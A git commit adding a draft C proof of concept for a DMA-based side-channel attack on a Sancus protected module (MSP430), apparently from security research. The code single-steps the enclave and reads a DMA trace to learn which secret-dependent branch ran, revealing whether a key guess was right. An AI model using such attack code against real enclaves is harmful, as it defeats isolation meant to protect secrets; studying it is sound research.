41af36dd5966daf6021b750be6abba20e2938881
marton bognar <martonbognar@sch.bme.hu>
2020-03-08 14:11:17 +0100

    Add draft example for DMA side-channel attack

---
+++ dma-side-channel/main.c
@@ -0,0 +1,81 @@
+#include <stdint.h>
+#include <msp430.h>
+#include <sancus/sm_support.h>
+#include <sancus_support/sm_io.h>
+#include <sancus_support/sancus_step.h>
+
+#define MAX_COUNTER (0xf)
+
+int instrAfterCtr = 0;
+uint16_t **dma_addr      = (uint16_t**) 0x0070;
+uint16_t *dma_countdown = (uint16_t*) 0x0072;
+uint16_t *dma_trace     = (uint16_t*) 0x0074;
+uint16_t delay = 0;
+
+DECLARE_SM(foo, 0x1234);
+
+void SM_ENTRY(foo) test(char key) {
+    char * p = &key;
+    __asm__ __volatile__(
+        "mov %0, r6\n\t"
+        "mov #0x42, r7\n\t"
+        "cmp.b @r6+, r7\n\t"
+        "jz 1f\n\t"
+        "bis #0x1, r7\n\t"
+        "jmp 2f\n\t"
+        "1: nop\n\t"
+        "nop\n\t"
+        "nop\n\t"
+        "2: nop\n\t"
+        :
+        :"m"(p)
+        :"r6", "r7"
+    );
+}
+
+/*
+ * For the JMP 2f instruction, the program memory trace will be 0000111111000000
+ * For the NOP    instruction, the program memory trace will be 0000111110000000
+ *
+ * By checking the different bit at the 0x40 position, we can tell which branch
+ * was taken (the JPM is executed if the guess was incorrect, after the
+ * bit is set).
+ *
+ * Both the +30 for the delay and the 36 for the instruction value are
+ * determined empirically.
+ */
+
+void irqHandler(void)
+{
+    delay = __ss_isr_reti_latency + 30;
+    uint16_t *pmem_addr = (uint16_t*) irqHandler;
+    pr_info1("%x\n", *dma_trace);
+    if (instrAfterCtr == 36) {
+        if (*dma_trace & 0x40) {
+            pr_info("Key was not guessed!");
+        } else {
+            pr_info("Key was guessed!");
+        }
+    }
+    ++instrAfterCtr;
+    *dma_addr = pmem_addr;
+    *dma_countdown = delay;
+}
+
+int main()
+{
+    msp430_io_init();
+    asm("eint\n\t");
+    sancus_enable(&foo);
+
+    __ss_start();
+    test(0x41);
+    instrAfterCtr = 0;
+    __ss_start();
+    test(0x42);
+
+    EXIT();
+}
+
+/* ======== TIMER A ISR ======== */
+SANCUS_STEP_ISR_ENTRY2(irqHandler, __ss_end)
